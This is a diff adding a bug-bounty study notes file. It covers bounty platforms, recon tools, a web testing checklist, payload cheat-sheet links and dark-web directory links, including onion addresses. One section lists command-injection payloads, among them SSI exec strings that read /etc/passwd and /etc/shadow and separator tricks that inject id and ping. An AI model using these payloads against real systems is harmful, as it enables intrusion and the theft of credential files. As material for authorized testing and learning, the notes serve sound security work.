@@ -8,3 +8,762 @@ openbounty ===> http://openbugbounty.org/
 Google Dorks
 site:example.com inurl:security OR inurl:bug-bounty
 
+
+
+                                                                            Bug Bounty
+❤️‍🔥Bug Bounty Guide 2022❤️‍🔥
+
+Bug Bounty is based on finding vulnerabilities in certain software.‍To claim the bounty, bugs must be original and previously unreported
+
+❇️Bug Bounty Platforms❇️
+
+🍎HackerOne
+https://www.hackerone.com
+🍎Bugcrowd
+https://www.bugcrowd.com
+🍎Synack
+https://www.synack.com
+🍎Detectify
+https://cs.detectify.com
+🍎Cobalt
+https://cobalt.io
+🍎Open Bug Bounty
+https://www.openbugbounty.org
+🍎Zero Copter
+https://www.zerocopter.com
+🍎Yes We Hack
+https://www.yeswehack.com
+🍎Hacken Proof
+https://hackenproof.com
+🍎Vulnerability Lab
+https://www.vulnerability-lab.com
+🍎Fire Bounty
+https://firebounty.com
+🍎Intigrity
+https://intigrity.com/
+🍎Safe Hats
+https://safehats.com
+🍎Red Storm
+https://www.redstorm.io/
+🍎Cyber Army
+https://www.cyberarmy.id
+🍎Yogosha
+https://yogosha.com
+
+
+
+https://github.com/riramar/Web-Attack-Cheat-Sheet
+https://github.com/bittentech/Bug-Bounty-Beginner-Roadmap
+
+portswigger labs
+
+-----> Analytics and Technology
+
+wappalyzer
+whatsweb
+
+--------------------------------------------------------------------------
+
+-----> Sub-domain Enumeration
+
+https://subdomainfinder.c99.nl/
+https://crt.sh
+https://developers.facebook.com/tools/ct/search/
+https://www.virustotal.com/#/domain/domain.com
+https://securitytrails.com/domain/microsoft.com/dns
+https://seckrd.com/subdomain-finder.php
+
+CLI Tools
+subfinder, amass
+
+--------------------------------------------------------------------------
+
+-----> Search Engines
+
+https://www.shodan.io/
+
+https://search.censys.io/
+https://censys.io/ipv4?q=microsoft.com
+
+https://dnsdumpster.com/
+
+https://www.onyphe.io/
+
+https://viz.greynoise.io/
+
+https://www.criminalip.io/
+
+https://www.zoomeye.org/
+
+https://en.fofa.info/
+
+https://grep.app/
+
+https://netlas.io/
+
+https://leakix.net/
+
+
+
+To check IP belongs to domain or not
+
+https://www.sslshopper.com/ssl-checker.html#hostname=
+
+--------------------------------------------------------------------------
+
+
+---> IP Ranges
+
+https://bgp.he.net/search?search%5Bsearch%5D=Smule&commit=Search
+https://whois.arin.net/ui/query.do
+
+---> Port Scanning & NSE Scripts
+nmap
+naabu
+masscan
+rustscan
+
+---> Github & Google Dorking
+https://github.com/0xPugal/Awesome-Dorks
+
+---> JS files recon
+
+Link Finder
+SecretFinder
+jsleak
+TruffleHog
+
+
+-----> Content Discovery & Fuzzing
+
+file, folder, endpoints, parameters
+
+wayback archive, waybackurls, gau/gauplus, katana
+dirsearch, dirb
+wffuf
+arjun, paramspider, param-miner
+
+
+--------------------------------------------------------------------------
+
+
+
+-----> Acquisitions and Company History
+
+https://www.crunchbase.com/
+
+
+
+
+
+
+subdomain takeover
+
+subzy
+subjack
+aquatone
+
+subzy run --targets boat-lifestyle.com.txt
+
+open redirect
+waybackurls (crawler tool)
+waybackurls testphp.vulnweb.com | tee testphpwayback.txt
+
+
+
+403 bypass
+
+
+
+
+
+                                                                                    Useful links
+Recon on wildcard domain
+ - [ ] Run amass
+ - [ ] Run subfinder
+ - [ ] Run assetfinder
+ - [ ] Run dnsgen
+ - [ ] Run massdns
+ - [ ] Use httprobe
+
+ Run aquatone (screenshot for alive host)
+- [ ] Single Domain
+- [ ] Scanning
+ - [ ] Nmap scan
+ - [ ] Burp crawler
+ - [ ] ffuf (directory and file fuzzing)
+ - [ ] hakrawler/gau/paramspider
+ - [ ] Linkfinder
+ - [ ] Url with Android application
+ - [ ]  Collect all the subdomains into one output file and pipe it to httpx tool ( To check whether the hosts are alive). 
+ 
+Manual checking
+ - [ ] Shodan
+ - [ ] Censys
+ - [ ] Google dorks
+ - [ ] Pastebin
+ - [ ] Github
+ - [ ] OSINT
+ 
+Information Gathering
+ Manually explore the site
+ - [ ] Spider/crawl for missed or hidden content
+ - [ ] Check for files that expose content, such as robots.txt, sitemap.xml, .DS_Store
+ - [ ] Check the caches of major search engines for publicly accessible sites
+ - [ ] Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)
+ - [ ] Perform Web Application Fingerprinting
+ - [ ] Identify technologies used
+ - [ ] Identify user roles
+ - [ ] Identify application entry points
+ - [ ] Identify client-side code
+ - [ ] Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)
+ - [ ] Identify co-hosted and related applications
+ - [ ] Identify all hostnames and ports
+ - [ ] Identify third-party hosted content
+ - [ ] Identify Debug parameters
+ 
+Configuration Management
+ - [ ] Check for commonly used application and administrative URLs
+ - [ ] Check for old, backup and unreferenced files
+ - [ ] Check HTTP methods supported and Cross Site Tracing (XST)
+ - [ ] Test file extensions handling
+ - [ ] Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)
+ - [ ] Test for policies (e.g. Flash, Silverlight, robots)
+ - [ ] Test for non-production data in live environment, and vice-versa
+ - [ ] Check for sensitive data in client-side code (e.g. API keys, credentials)
+ 
+Secure Transmission
+ - [ ] Check SSL Version, Algorithms, Key length
+ - [ ] Check for Digital Certificate Validity (Duration, Signature and CN)
+ - [ ] Check credentials only delivered over HTTPS
+ - [ ] Check that the login form is delivered over HTTPS
+ - [ ] Check session tokens only delivered over HTTPS
+ - [ ] Check if HTTP Strict Transport Security (HSTS) in use
+
+Authentication
+ - [ ] Test for user enumeration
+ - [ ] Test for authentication bypass
+ - [ ] Test for bruteforce protection
+ - [ ] Test password quality rules
+ - [ ] Test remember me functionality
+ - [ ] Test for autocomplete on password forms/input
+ - [ ] Test password reset and/or recovery
+ - [ ] Test password change process
+ 
+ Test CAPTCHA
+ - [ ] Test multi factor authentication
+ - [ ] Test for logout functionality presence
+ - [ ] Test for cache management on HTTP (eg Pragma, Expires, Max-age)
+ - [ ] Test for default logins
+ - [ ] Test for user-accessible authentication history
+ - [ ] Test for out-of channel notification of account lockouts and successful password changes
+ - [ ] Test for consistent authentication across applications with shared authentication schema / SSO
+
+Session Management
+ - [ ] Establish how session management is handled in the application (eg, tokens in cookies, token in URL)
+ - [ ] Check session tokens for cookie flags (httpOnly and secure)
+ - [ ] Check session cookie scope (path and domain)
+ - [ ] Check session cookie duration (expires and max-age)
+ - [ ] Check session termination after a maximum lifetime
+ - [ ] Check session termination after relative timeout
+ - [ ] Check session termination after logout
+ - [ ] Test to see if users can have multiple simultaneous sessions
+ - [ ] Test session cookies for randomness
+ - [ ] Confirm that new session tokens are issued on login, role change and logout
+ - [ ] Test for consistent session management across applications with shared session management
+ - [ ] Test for session puzzling
+ - [ ] Test for CSRF and clickjacking
+
+Authorization
+ - [ ] Test for path traversal
+ - [ ] Test for bypassing authorization schema
+ - [ ] Test for vertical Access control problems (a.k.a. Privilege Escalation)
+ - [ ] Test for horizontal Access control problems (between two users at the same privilege level)
+ - [ ] Test for missing authorization
+
+Data Validation
+ - [ ] Test for Reflected Cross Site Scripting
+ - [ ] Test for Stored Cross Site Scripting
+ - [ ] Test for DOM based Cross Site Scripting
+ - [ ] Test for Cross Site Flashing
+ - [ ] Test for HTML Injection
+ - [ ] Test for SQL Injection
+ - [ ] Test for LDAP Injection
+ - [ ] Test for ORM Injection
+ - [ ] Test for XML Injection
+ - [ ] Test for XXE Injection
+ - [ ] Test for SSI Injection
+ - [ ] Test for XPath Injection
+ - [ ] Test for XQuery Injection
+ - [ ] Test for IMAP/SMTP Injection
+ - [ ] Test for Code Injection
+ - [ ] Test for Expression Language Injection
+ - [ ] Test for Command Injection
+ - [ ] Test for Overflow (Stack, Heap and Integer)
+ - [ ] Test for Format String
+ - [ ] Test for incubated vulnerabilities
+ - [ ] Test for HTTP Splitting/Smuggling
+ - [ ] Test for HTTP Verb Tampering
+ - [ ] Test for Open Redirection
+ - [ ] Test for Local File Inclusion
+ - [ ] Test for Remote File Inclusion
+
+ Compare client-side and server-side validation rules
+ - [ ] Test for NoSQL injection
+ - [ ] Test for HTTP parameter pollution
+ - [ ] Test for auto-binding
+ - [ ] Test for Mass Assignment
+ - [ ] Test for NULL/Invalid Session Cookie
+
+Denial of Service
+ - [ ] Test for anti-automation
+ - [ ] Test for account lockout
+ - [ ] Test for HTTP protocol DoS
+ - [ ] Test for SQL wildcard DoS
+
+Business Logic
+ - [ ] Test for feature misuse
+ - [ ] Test for lack of non-repudiation
+ - [ ] Test for trust relationships
+ - [ ] Test for integrity of data
+ - [ ] Test segregation of duties
+
+Cryptography
+ - [ ] Check if data which should be encrypted is not
+ - [ ] Check for wrong algorithms usage depending on context
+ - [ ] Check for weak algorithms usage
+ - [ ] Check for proper use of salting
+ - [ ] Check for randomness functions
+
+Risky Functionality - File Uploads
+ - [ ] Test that acceptable file types are whitelisted
+ - [ ] Test that file size limits, upload frequency and total file counts are defined and are enforced
+ - [ ] Test that file contents match the defined file type
+ - [ ] Test that all file uploads have Anti-Virus scanning in-place.
+ - [ ] Test that unsafe filenames are sanitised
+ - [ ] Test that uploaded files are not directly accessible within the web root
+ - [ ] Test that uploaded files are not served on the same hostname/port
+ - [ ] Test that files and other media are integrated with the authentication and authorisation schemas
+
+Risky Functionality - Card Payment
+ - [ ] Test for known vulnerabilities and configuration issues on Web Server and Web Application
+ - [ ] Test for default or guessable password
+ - [ ] Test for non-production data in live environment, and vice-versa
+ - [ ] Test for Injection vulnerabilities
+ - [ ] Test for Buffer Overflows
+ - [ ] Test for Insecure Cryptographic Storage
+ - [ ] Test for Insufficient Transport Layer Protection
+ - [ ] Test for Improper Error Handling
+ - [ ] Test for all vulnerabilities with a CVSS v2 score > 4.0
+ - [ ] Test for Authentication and Authorization issues
+ - [ ] Test for CSRF
+ 
+HTML 5
+ - [ ] Test Web Messaging
+ - [ ] Test for Web Storage SQL injection
+ - [ ] Check CORS implementation
+ - [ ] Check Offline Web Application
+
+
+
+
+
+
+
+
+
+
+
+Complete Bug Bounty Cheat Sheet
+XSS
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/xss.md
+• https://github.com/ismailtasdelen/xss-payload-list
+
+SQLi
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/sqli.md
+
+SSRF
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/ssrf.md
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+
+CRLF
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/crlf.md
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
+
+CSV-Injection
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/csvinjection.md
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
+
+Command Injection
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+
+Directory Traversal
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+
+LFI
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/lfi.md
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+
+XXE
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/xxe.md
+
+Open-Redirect
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/open-redirect.md
+
+RCE
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/rce.md
+
+Crypto
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/crypto.md
+
+Template Injection
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/templateinjection.md
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+XSLT
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/xslt.md
+
+Content Injection
+• https://github.com/EdOverflow/bugbountycheatsheet/blob/master/cheatsheets/contentinjection.md
+
+• LDAP Injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
+
+• NoSQL Injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+
+• CSRF Injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
+
+• GraphQL Injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
+
+• IDOR
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+• ISCM
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Source%20Code%20Management
+
+LaTex Injection
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
+
+OAuth
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth
+
+XPATH Injection
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection
+
+Bypass Upload Tricky
+• https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
+
+
+
+
+Here are some of the tools that we use when we perform Live Recon Passive ONLY on Twitch:
+
+Recon-ng https://github.com/lanmaster53/recon-ng
+httpx https://github.com/projectdiscovery/httpx
+isup.sh https://github.com/gitnepal/isup
+Arjun https://github.com/s0md3v/Arjun
+jSQL https://github.com/ron190/jsql-injection
+Smuggler https://github.com/defparam/smuggler
+Sn1per https://github.com/1N3/Sn1per
+Spiderfoot https://github.com/smicallef/spiderfoot
+Nuclei https://github.com/projectdiscovery/nuclei
+Jaeles https://github.com/jaeles-project/jaeles
+ChopChop https://github.com/michelin/ChopChop
+Inception https://github.com/proabiral/inception
+Eyewitness https://github.com/FortyNorthSecurity/EyeWitness
+Meg https://github.com/tomnomnom/meg
+Gau - Get All Urls https://github.com/lc/gau
+Snallygaster https://github.com/hannob/snallygaster
+NMAP https://github.com/nmap/nmap
+Waybackurls https://github.com/tomnomnom/waybackurls
+Gotty https://github.com/yudai/gotty
+GF https://github.com/tomnomnom/gf
+GF Patterns https://github.com/1ndianl33t/Gf-Patterns
+Paramspider https://github.com/devanshbatham/ParamSpider
+XSSER https://github.com/epsylon/xsser
+UPDOG https://github.com/sc0tfree/updog
+JSScanner https://github.com/dark-warlord14/JSScanner
+Takeover https://github.com/m4ll0k/takeover
+Keyhacks https://github.com/streaak/keyhacks
+S3 Bucket AIO Pwn https://github.com/blackhatethicalhacking/s3-buckets-aio-pwn
+BHEH Sub Pwner Recon https://github.com/blackhatethicalhacking/bheh-sub-pwner
+GitLeaks https://github.com/zricethezav/gitleaks
+Domain-2IP-Converter https://github.com/blackhatethicalhacking/Domain2IP-Converter
+Dalfox https://github.com/hahwul/dalfox
+Log4j Scanner https://github.com/Black-Hat-Ethical-Hacking/log4j-scan
+Osmedeus https://github.com/j3ssie/osmedeus
+getJS https://github.com/003random/getJS
+
+                                                                        BugBounty Platforms
+1- HackerOne 
+2- Bugcrowd 
+3- Intigriti
+4-  Synack 
+5- YesWeHack
+6- HackenProof 
+7- Open Bug Bounty
+8- Bugbounter
+9- SafeHats
+10- HackenProof
+11- SecureBug
+12- Hackrate
+13- NordicDefender Bug Bounty
+14- Topcoder, a Wipro company
+https://github.com/disclose/bug-bounty-platforms
+
+
+
+
+Links
+https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist
+
+
+
+Wordlists
+wordlists.assetnote.io
+https://github.com/BonJarber/SecUtils/tree/master/clean_wordlist
+
+
+
+Tools
+
+https://github.com/vavkamil/awesome-bugbounty-tools
+
+https://github.com/vavkamil/awesome-bugbounty-tools?tab=readme-ov-file
+
+
+Amass (https://github.com/OWASP/Amass)
+subfinder (https://github.com/projectdiscovery/subfinder)
+Assetfinder (https://github.com/tomnomnom/assetfinder)
+dnsgen (https://github.com/ProjectAnte/dnsgen)
+massdns (https://github.com/blechschmidt/massdns)
+httprobe (https://github.com/tomnomnom/httprobe)
+aquatone (https://github.com/michenriksen/aquatone)
+
+
+
+
+
+                                                                            command line injection 
+                                                                            
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;id;
+|id
+- [x] |/usr/bin/id
+- [x] |id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+- [x] \n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+`id`
+$;/usr/bin/id
+
+
+
+
+
+
+                                                                                        Low Hanging Bugs
+1) Improper Output Neutralization
+2) Use of External-Controlled Format String
+3) Information Disclosure(Stack Trace, Version
+4)Session Fixation
+5) Unsafe Reflection
+6)Trust Boundary Violation
+7) Directory Travesal Download Items
+
+
+Websites
+https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet
+https://github.com/hackerschoice
+
+
+
+
+
+                                                                                        tools
+axiom-ls
+axiom-scan wildcards.txt -m subfinder -o subfinder.txt
+axiom-scan wildcards.txt -m gau -o gau.txt
+
+cat shodan.txt | httpx -title -sc -fr -silent-cname | anew httpx-ips.txt
+
+
+
+
+
+                                                        Some known parameter name for open redirect -
+?next=,?url=,?target=,?rurl=,?dest=,?destination=,?redir=,?redirect_uri=,?
+redirect_url=,?redirect=,/redirect/,/out?, ?view=,/login?to=,?image_url=,?go=,?
+return,?returnTo=,?return_to=,?checkout_url=,?continue=,?
+return_path=,success=,data=,qurl=, login, logout,ext=,clickurl=,goto=,rit_url=
+, forward_url=,, forward,pic=,callback_url=, jump, jump_url=,click?
+u=,originUrl=,origin=,Url=, desturl=,
+u=,page=,u1=,action,action_url=,Redirect=,sp_url=,service=,recurl=,j?
+url=,url=,uri,u=,q,link=,src=,tc?
+src=,linkAddress=,location=, burl=,request=,backurl=, RedirectUrl=, Redirect=
+,ReturnUrl=
+
+
+
+https://github.com/freelabz/secator ==> It supports dozens of well-known security tools and it is designed to improve productivity for pentesters and security researchers.
+
+pip install secator
+
+
+
+no rate limit vulnerability
+Account Take Over via Forgot Password Function
+
+
+                                                                        Common Web Attacks on Static Websites
+Cross-Site Scripting (XSS)
+Clickjacking
+Cross-Site Request Forgery (CSRF)
+HTTP Response Splitting
+Information Disclosure
+DNS Cache Poisoning
+Man-in-the-Middle (MitM) Attacks
+Content Spoofing
+Directory Traversal
+Denial of Service (DoS) and Distributed Denial of Service (DDoS)
+
+
+                                                                                    Vulnerability Assessment Checklists
+https://github.com/InfoSecExplorer/Vulnerability-Checklist
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Version 2
+http://helixthunkrogtkf.onion/
+Version 3
+ZeroDay Club: http://zerodayhukmtc56zualcmtvtto5xfz7gytgt7poxgkmgegng34p3xcyd.onion/
+
+Recon (Usually starts on the Surface web)
+https://www.reddit.com/r/deepweb/
+https://www.reddit.com/r/darknet/
+https://www.darkweblist.com/
+https://thedeepsearches.com
+VPN Overview: https://vpnoverview.com/privacy/anonymous-browsing/dark-web-websites-worth-visiting/
+Surface Linkers:
+TorLink - https://tor.link
+DarkFail - https://dark.fail
+TorFish - https://tor.fish/
+Daunt - https://daunt.link/
+Dark.Direct - https://dark.direct/
+TorHoo-https://torhoo.com/
+DeepWeb - https://deepweblinks.net
+
+Serious Searching: Linkers, Lists, Search Engines, Markets & Forums
+Tor Link List - http://tolilie73vf5h6pe4ahxobzduybhrh5shhpqozrbkkx3p5gyjcuvtcid.onion/
+Tor Link https://tor.link/
+Tor Fish http://torfish7kblk4gvostgkzdddp4ngp4cxxsl2oqfdbyzrlsz3x3j7fbyd.onion/
+Dark Eye: http://darkeyepxw7cuu2cppnjlgqaav6j42gyt43clcn4vjjf7llfyly5cxid.onion/
+Daunt: https://daunt.link/
+Tor66: http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion
+Dark.Fail: http://darkfailenbsdla5mal2mxn2uz660d5vtzd5qozslagrfzachha3f3id.onion/
+DarkNet Trust: https://darknetlive.com/
+
+
+
+
+OSINT Tools & Techniques for the Dark Web
+As OSINT investigators, collectors, and analysts, all must be familiar with the dark web and be able
+to navigate it with efficiency, as well as steer clear of dangers. We also have to be able to extract
+information from it, about a targeted, in an efficient manner. These tools can be used to get started
+and get you comfortable inspecting the dark web.
+Hunchly - https://www.hunch.ly/darkweb-osint/
+DarkSearch - https://darksearch.io/
+TorBot - https://github.com/DedSecInside/TorBot
+Fresh Onions - https://github.com/dirtyfilthy/freshonions-torscraper
+TorCrawl - https://github.com/MikeMeliz/TorCrawl.py
+Onion.Live - https://onion.live/
+IACA Dark Web Invest - https://iaca-darkweb-tools.com/
+Onion Nmap - https://github.com/milesrichardson/docker-onion-nmap
+Onion Scan - https://github.com/s-rah/onionscan
+⚫ Onioff - https://github.com/k4m4/onioff
+Onion Ingestor - https://github.com/danieleperera/OnionIngestor
+Katana-DS https://github.com/adnane-X-tebbaa/Katana
+
